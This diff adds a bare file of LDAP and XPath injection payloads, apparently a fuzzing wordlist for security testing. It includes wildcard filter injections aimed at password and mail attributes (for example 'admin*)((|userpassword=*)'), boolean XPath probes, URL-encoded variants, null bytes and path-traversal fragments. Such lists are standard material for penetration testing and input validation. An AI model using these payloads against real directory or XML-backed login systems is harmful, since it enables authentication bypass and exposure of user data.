@@ -1,0 +1,38 @@
+|
+!
+/
+//
+//*
+.
+../
+../../
+(
+)
+@*
+'*'
+*
+*|
+*/*
+*()|&'
+&
+#
+%00
+%21
+*()|%26'
+%26
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+admin*
+admin*)((|userpassword=*)
+' and count(/@*)=1 and '1'='1
+' and count(/*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+count(/child::node())
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+x' or name()='username' or 'x'='y
